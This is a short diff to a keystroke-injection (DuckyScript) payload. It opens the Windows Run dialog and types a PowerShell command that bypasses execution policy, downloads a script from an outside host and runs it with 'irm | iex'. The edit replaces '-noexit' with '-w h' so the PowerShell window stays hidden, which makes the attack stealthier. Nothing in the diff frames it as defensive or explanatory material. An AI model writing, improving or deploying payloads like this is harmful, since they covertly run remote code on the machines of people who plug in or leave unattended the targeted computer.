@@ -11,6 +11,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -noexit -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
+STRING powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
 DELAY 500
 ENTER
